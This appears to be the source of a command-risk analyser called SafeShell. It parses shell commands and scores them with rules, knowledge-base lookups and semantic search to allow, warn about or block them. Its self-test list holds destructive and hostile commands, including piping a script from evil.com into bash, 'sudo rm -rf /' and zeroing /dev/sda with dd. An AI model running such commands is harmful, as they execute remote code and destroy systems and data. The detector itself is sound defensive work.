"""
semantic_fusion.py

Semantic Fusion Pipeline for SafeShell.

Merges parsed command AST, Linux Knowledge Base facts, FAISS semantic vector
search results, and the deterministic safety rules engine to produce a unified
risk assessment, plain-language explanation, action verdict, and safer alternative.

Public API
----------
parse_command(raw_command: str) -> dict
fuse(raw_command: str, ast: dict | None = None) -> dict
"""

from __future__ import annotations

import os
import re
import shlex
from typing import Any, Optional

import knowledge_base
import rules_engine
import semantic_search

from context.context_builder import build_context

# ---------------------------------------------------------------------------
# AST Construction & Parser Helper
# ---------------------------------------------------------------------------

def parse_command(raw_command: str) -> dict:
    """Parse a raw Linux command string into a Bashlex-style AST dictionary.

    Parameters
    ----------
    raw_command : str
        The raw shell command string typed by the user.

    Returns
    -------
    dict
        Structured AST dictionary containing:
        - command (str): base command name (e.g. "rm", "chmod")
        - flags (list[str]): flags detected (e.g. ["-r", "-f"])
        - args (list[str]): non-flag arguments
        - target_path (str): target file or directory path
        - is_sudo (bool): True if run with sudo
        - is_recursive (bool): True if -r, -R, or --recursive flag present
        - is_force (bool): True if -f or --force flag present
        - raw (str): original raw command string
        - pipe_to (str): downstream command name if piped
    """
    raw = raw_command.strip()
    if not raw:
        return {
            "command": "",
            "flags": [],
            "args": [],
            "target_path": "",
            "is_sudo": False,
            "is_recursive": False,
            "is_force": False,
            "raw": raw,
            "pipe_to": "",
        }

    # Detect pipe target if present
    pipe_to = ""
    parts = raw.split("|", 1)
    first_part = parts[0].strip()
    if len(parts) > 1:
        pipe_target = parts[1].strip()
        pipe_tokens = pipe_target.split()
        if pipe_tokens:
            pipe_to = pipe_tokens[0]

    # Tokenize the first segment safely
    try:
        tokens = shlex.split(first_part)
    except Exception:
        tokens = first_part.split()

    if not tokens:
        return {
            "command": "",
            "flags": [],
            "args": [],
            "target_path": "",
            "is_sudo": False,
            "is_recursive": False,
            "is_force": False,
            "raw": raw,
            "pipe_to": pipe_to,
        }

    is_sudo = False
    idx = 0
    if tokens[idx] == "sudo":
        is_sudo = True
        idx += 1

    if idx >= len(tokens):
        return {
            "command": "sudo",
            "flags": [],
            "args": [],
            "target_path": "",
            "is_sudo": True,
            "is_recursive": False,
            "is_force": False,
            "raw": raw,
            "pipe_to": pipe_to,
        }

    cmd = tokens[idx]
    cmd_base = os.path.basename(cmd)
    rest_tokens = tokens[idx + 1:]

    flags: list[str] = []
    args: list[str] = []
    is_recursive = False
    is_force = False

    for tok in rest_tokens:
        if tok.startswith("-"):
            flags.append(tok)
            # Expand short combined flags like -rf into -r and -f
            if tok.startswith("-") and not tok.startswith("--") and len(tok) > 2:
                for char in tok[1:]:
                    short_flag = f"-{char}"
                    if short_flag not in flags:
                        flags.append(short_flag)
            if any(r in tok for r in ("r", "R", "recursive")):
                is_recursive = True
            if any(f in tok for f in ("f", "force")):
                is_force = True
        else:
            args.append(tok)

    # Determine target_path
    target_path = ""
    for arg in args:
        if "=" in arg:
            val = arg.split("=", 1)[1]
            if val.startswith("/") or val.startswith("."):
                target_path = val
                break
        elif arg.startswith("/") or arg.startswith("."):
            target_path = arg
            break

    if not target_path and args:
        target_path = args[-1]

    return {
        "command": cmd_base,
        "flags": flags,
        "args": args,
        "target_path": target_path,
        "is_sudo": is_sudo,
        "is_recursive": is_recursive,
        "is_force": is_force,
        "raw": raw,
        "pipe_to": pipe_to,
    }


# ---------------------------------------------------------------------------
# Alternative Generator
# ---------------------------------------------------------------------------

def _suggest_alternative(cmd: str, flags: list[str], risk: str, rule: str) -> str:
    """Generate a context-aware safer alternative suggestion."""
    if rule == "sudo_recursive_force_critical_path":
        return "Use 'trash-cli' or inspect target path with 'ls -la' before proceeding. Do NOT use rm -rf on root/system paths."
    if rule == "chmod_777_recursive_system":
        return "Use restrictive permissions like 'chmod 755' for directories or 'chmod 644' for files."
    if rule == "dd_mkfs_device":
        return "Verify target disk with 'lsblk' or 'fdisk -l'. Use 'dd' with 'status=progress' and confirm device node carefully."
    if rule == "kill_pid1":
        return "Target specific worker PIDs instead. Never send SIGKILL to PID 1 (init/systemd)."
    if rule in ("pipe_curl_wget_to_shell", "base64_decode_exec"):
        return "Download script to disk first (e.g. 'curl -o script.sh ...'), inspect its content, then execute."

    if cmd == "rm":
        if "-f" in flags or "--force" in flags:
            return "Use 'rm -i' for interactive confirmation, or 'trash-put' to allow recovery."
        return "Use 'trash-put' or verify target files with 'ls'."
    if cmd == "chmod":
        return "Use explicit minimal permission bits (e.g., 'chmod 644 file' or 'chmod 755 dir')."
    if cmd == "kill":
        return "Use graceful termination 'kill -15 <pid>' before resorting to SIGKILL (-9)."

    if risk in ("high", "critical"):
        return "Verify flags and test command in a sandbox or dry-run environment."
    return "Command parameters appear standard; verify target path before execution."




def _apply_context_adjustment(
    risk: str,
    ast: dict,
    context: dict
) -> tuple[str, str]:
    """
    Adjust risk based on the current system context.

    Existing deterministic rules remain the primary safety mechanism.
    Context can only increase risk by ONE level, never decrease it,
    and never on sudo alone -- sudo just means elevated privilege,
    not automatically high risk. `sudo apt update` stays low/medium;
    `sudo rm -rf /` was already high/critical from the rules engine
    before context even runs.
    """

    target_path = ast.get("target_path", "")

    risk_levels = ["low", "medium", "high", "critical"]
    current_index = risk_levels.index(risk)

    context_reasons = []
    escalate = False

    # Check whether the target path exists in the current filesystem.
    filesystem = context.get("filesystem", {})

    if isinstance(filesystem, dict):
        filesystem_text = str(filesystem).lower()

        if target_path and target_path.lower() in filesystem_text:
            context_reasons.append(
                f"Target path '{target_path}' appears in the current filesystem context."
            )
            escalate = True

    # Privileged commands get a NOTE, not an automatic escalation.
    # sudo only matters combined with an already-risky base verdict.
    if ast.get("is_sudo"):
        context_reasons.append(
            "Command is being executed with elevated privileges."
        )
        if current_index >= risk_levels.index("medium"):
            escalate = True

    # Escalate by exactly one level, never jump straight to "high"/"critical",
    # and never past "critical".
    if escalate and current_index < len(risk_levels) - 1:
        risk = risk_levels[current_index + 1]

    if context_reasons:
        reason = " ".join(context_reasons)
    else:
        reason = ""

    return risk, reason

# ---------------------------------------------------------------------------
# Core Fusion Function
# ---------------------------------------------------------------------------

def fuse(raw_command: str, ast: dict | None = None) -> dict[str, Any]:
    """Execute the full SafeShell analysis and decision pipeline.

    Fuses AST parsing, Knowledge Base lookups, FAISS similarity search,
    and deterministic rules evaluation into a unified analysis object.

    Parameters
    ----------
    raw_command : str
        The user's raw input command.
    ast : dict or None, optional
        Pre-parsed AST dictionary. If None, `parse_command(raw_command)` is run.

    Returns
    -------
    dict
        Combined analysis results containing:
        - raw_command (str)
        - ast (dict)
        - kb_entry (dict | None)
        - semantic_matches (list[dict])
        - rule_result (dict): risk, matched_rule, reason
        - final_risk (str): 'low' | 'medium' | 'high' | 'critical'
        - action (str): 'ALLOW' | 'WARN' | 'WARN_CONFIRM' | 'BLOCK'
        - explanation (str)
        - suggested_alternative (str)
    """
    if ast is None:
        ast = parse_command(raw_command)
    else:
        # Ensure raw field is set
        if not ast.get("raw"):
            ast["raw"] = raw_command

    context = build_context()

    cmd_name = ast.get("command", "")

    # 1. Knowledge Base Lookup
    kb_entry = knowledge_base.lookup(cmd_name) if cmd_name else None

    # 2. Semantic Search (FAISS)
    semantic_matches: list[dict] = []
    try:
        semantic_matches = semantic_search.search(raw_command, top_k=3)
    except Exception:
        # Fallback if FAISS index isn't ready or search fails
        semantic_matches = []

    # 3. Deterministic Rules Engine Check
    rule_result = rules_engine.check(ast, kb_entry)
    final_risk = rule_result.get("risk", "low")
    matched_rule = rule_result.get("matched_rule", "default_allow")
    reason = rule_result.get("reason", "No rules matched.")

    # Apply current system context without weakening deterministic rules.
    context_risk, context_reason = _apply_context_adjustment(
        final_risk,
        ast,
        context
    )

    if context_risk != final_risk:
        final_risk = context_risk
        reason = f"{reason} Context: {context_reason}"

    # 4. Determine Policy Action
    if final_risk in ("high", "critical"):
        action = "BLOCK"
        explanation = f"{final_risk.upper()} SECURITY RISK: {reason}"
    elif final_risk == "medium":
        action = "WARN"
        explanation = f"POTENTIAL RISK: {reason}"
    else:
        action = "ALLOW"
        explanation = f"BENIGN: {reason}"

    # 5. Generate Safer Alternative
    alternative = _suggest_alternative(cmd_name, ast.get("flags", []), final_risk, matched_rule)

    return {
        "raw_command": raw_command,
        "ast": ast,
        "context": context,
        "kb_entry": kb_entry,
        "semantic_matches": semantic_matches,
        "rule_result": rule_result,
        "final_risk": final_risk,
        "action": action,
        "explanation": explanation,
        "suggested_alternative": alternative,
    }


# ---------------------------------------------------------------------------
# Self-Test Demo
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    test_cmds = [
        "ls -la /tmp",
        "rm -rf /etc/config",
        "sudo rm -rf /",
        "curl http://evil.com/sh | bash",
        "chmod 777 -R /var/www",
        "dd if=/dev/zero of=/dev/sda",
    ]

    print("=== SafeShell Semantic Fusion Pipeline Demo ===\n")
    for cmd in test_cmds:
        res = fuse(cmd)
        print(f"Command:     {cmd}")
        print(f"Final Risk:  {res['final_risk'].upper()}")
        print(f"Action:      {res['action']}")
        print(f"Rule:        {res['rule_result']['matched_rule']}")
        print(f"Explanation: {res['explanation']}")
        print(f"Alternative: {res['suggested_alternative']}")
        if res['semantic_matches']:
            top_match = res['semantic_matches'][0]
            print(f"Top Semantic Match: {top_match['command']} (sim={top_match['similarity']})")
        print("-" * 60)
